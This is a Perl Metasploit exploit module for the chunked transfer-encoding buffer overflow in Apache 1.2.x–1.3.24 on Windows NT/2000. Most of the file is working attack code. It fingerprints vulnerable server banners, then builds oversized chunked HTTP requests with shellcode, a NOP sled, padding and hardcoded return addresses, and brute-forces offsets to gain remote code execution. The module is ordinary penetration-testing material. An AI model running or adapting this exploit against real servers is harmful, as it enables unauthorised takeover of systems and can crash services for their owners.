package Msf::Exploit::apache_chunked_win32;
use base "Msf::Exploit";
use strict;
my $advanced = { 'PAD' => ['0', 'Specify the padding value to be used'] };

my $info =
{
    'Name'  => 'Apache Win32 Chunked Encoding',
    'Version'  => '$Revision: 1.21 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 8100,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
               },
    
    'Description'  => qq{
        This exploits the chunked encoding bug found in Apache
        versions 1.2.x to 1.3.24. This particular module will only
        work reliably against versions 1.3.17 on up running on
        Windows 2000 or NT. This exploit may complelely crash
        certain versions of Apache shipped with Oracle and various
        web application frameworks. This exploit could not be detected
        by versions of the Snort IDS prior to 2.1.2 :)
    },
     
    'Refs'  =>  [
                    'http://www.osvdb.org/838',
                    'http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html'
                ],
    'DefaultTarget' => 0,
    'Targets' => [
                   ['Windows NT/2K Brute Force',""],
                   ['Windows 2000', 0x1c0f143c, "\x81\xc4\x14\x05\x00\x00\xff\xe4"],
                   ['Windows NT',   0x1c0f1022, "\x81\xec\x18\xfc\xff\xff\xff\xe4"],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );

    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Could not connect: " . $s->GetError());
        return(0);
    }
    $s->Send("GET / HTTP/1.0\r\n\r\n");
    my $res = $s->Recv(-1, 5);
    $s->Close();
    
    if (! $res) {
        $self->PrintLine("[*] No response to request");
        return(0);
    }
    
    if ($res =~ m/^Server:([^\n]+)/sm) {
        my $svr = $1;
        $svr =~ s/(^\s+|\r|\s+$)//g;
        
        # These signatures were taken from the apache_chunked._encoding.nasl Nessus plugin
        if ($svr =~ /IBM_HTTP_SERVER\/1\.3\.(19\.[3-9]|2[0-9]\.)/) {
            $self->PrintLine("[*] IBM backported the patch, this system is not vulnerable");
            return(0);
        } 
        elsif ( $svr =~ /Apache(-AdvancedExtranetServer)?\/(1\.([0-2]\.[0-9]|3\.([0-9][^0-9]|[0-1][0-9]|2[0-5]))|2\.0.([0-9][^0-9]|[0-2][0-9]|3[0-8]))/) {
            $self->PrintLine("[*] Vulnerable server '$svr'");
            return(1);
        }
        
        $self->PrintLine("[*] Server is probably not vulnerable '$svr'");
        return(0);  
    }
    
    # Return true if there is no server banner
    $self->PrintLine("[*] No server banner was found in the HTTP headers");
    return(1);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
    
    my @targets;
    my @offsets;
    my $pad;

    if ($target_idx == 0) {
        @targets = @{$self->Targets};
        shift(@targets);
    } else {
        @targets = $self->Targets->[ $target_idx ];
    } 
    
    if (my $pad = $self->GetVar('PAD')) {
        foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] }
    } 
    else {
        for ($pad = 348; $pad < 368; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }
        for ($pad = 200; $pad < 348; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }
        for ($pad = 360; $pad < 400; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }
    }

    foreach my $offset (@offsets) {
        my $request;
        $request  = "GET / HTTP/1.1\r\n";
        $request .= "Host: $target_host:$target_port\r\n";
        $request .= "Transfer-Encoding: CHUNKED\r\n";
        $request .= "\r\n";
        $request .= "DEADBEEF ";

        # large nop sled plus shellcode
        $request .= $shellcode . "\r\n";

        # these three bytes are for address alignment
        $request .= "PAD";  

        # place the appropriate amount of padding
        $request .= ("O" x $offset->[0]);

        # this is where ebx or esi points, make it jump over the return address
        $request .= "XX" . "\xeb\x04\xeb\x04";  

        # this is the return address
        $request .= pack("V", $offset->[1]);

        # a mini nop sled for the short jmp to land in
        $request .= ("\x90" x 16);

        # target prologue
        $request .= $offset->[2];
        
        
        my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
        if (! $s->Tcp($target_host, $target_port)) {
            $self->PrintLine("[*] Could not connect: " . $s->GetError());
            return;
        }
    
        $self->PrintLine("[*] Trying to exploit ". $offset->[3] ." using return " . sprintf("0x%.8x", $offset->[1]) . " with padding of " . $offset->[0] . "...");
        $s->Send($request);
        sleep(2);
        $s->Close();
    }
    return;
}
